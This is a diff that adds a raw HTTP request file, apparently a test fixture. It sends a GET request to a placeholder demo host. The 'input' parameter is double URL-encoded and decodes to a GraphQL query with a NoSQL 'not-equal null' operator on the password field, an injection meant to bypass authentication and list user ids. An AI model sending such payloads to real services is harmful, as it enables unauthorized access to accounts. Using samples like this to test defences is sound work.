@@ -1,0 +1,4 @@
+GET /a?input=%257Buser%2528where%253A%257Bpassword%253A%257B_ne%253Anull%257D%257D%2529%257Bid%257D%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
